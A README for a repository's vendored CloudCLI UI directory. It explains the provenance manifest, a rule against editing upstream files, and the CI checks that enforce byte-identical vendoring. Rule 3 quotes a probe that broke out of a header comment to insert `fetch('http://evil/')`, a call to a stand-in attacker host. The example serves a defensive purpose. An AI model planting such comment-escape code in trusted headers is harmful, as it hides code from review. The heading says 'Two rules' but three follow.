# web/src/vendor

Third-party source carried in this repository verbatim, so that upstream's later
changes can still be diffed and applied to it.

```
cloudcli.MANIFEST.json   provenance record — tether's file, machine-checked
cloudcli/                CloudCLI UI's bytes. Every file in here is upstream's.
```

The manifest sits *beside* the vendor root rather than inside it on purpose:
`scripts/check-vendor-provenance.sh` asserts that **every** file under
`cloudcli/` is declared, with no exceptions and no exclusion list. Putting
tether's own bookkeeping files in that directory would have required an
exclusion list, and an exclusion list is a hole someone eventually widens.

## Two rules

1. **Do not edit anything under `cloudcli/`.** Not to fix a lint warning, not to
   change an import path, not to delete a line we do not use. Those files are
   kept byte-identical to the upstream tag they name so that
   `git diff <old-sha>..<new-sha>` still applies to them. Local changes go in
   `web/src/ui/`, which wraps them.

2. **Adding a file here means adding it to the manifest.** CI derives the file
   list from the filesystem, not from the manifest, so an undeclared file is a
   red build rather than an untracked one.

3. **The provenance header is not free text.** It has to stay a single
   self-contained block comment — line 1 exactly, ` * ` continuations, no `*/`
   before the terminator — and every byte of it is hashed as `header_sha256`.
   That region sits *above* where the content hash starts, so it is trusted, and
   a trusted region nothing checks is a place to hide code. It has been used that
   way once already, in a probe: `... */ fetch('http://evil/') /* ...` inside the
   header, body byte-perfect, both offline checks green.

All three rules, the absorption procedure, and the AGPL Section 7 obligations
that come with this code: **`docs/vendoring-cloudcli.md`**.

## Checking it locally

```bash
make check-vendor                                  # offline; per-PR CI gate
make check-vendor-diff BASE=@origin/main           # offline; per-PR CI gate
make verify-vendor-upstream CLONE=/tmp/ccui        # needs a full upstream clone
```

`check-vendor` compares the tree against the manifest. `check-vendor-diff`
compares the manifest against the manifest at your base, because a content hash
that moves while its tag and sha stay put is an in-place edit that was rehashed —
and that is invisible to any check that only looks at one commit.
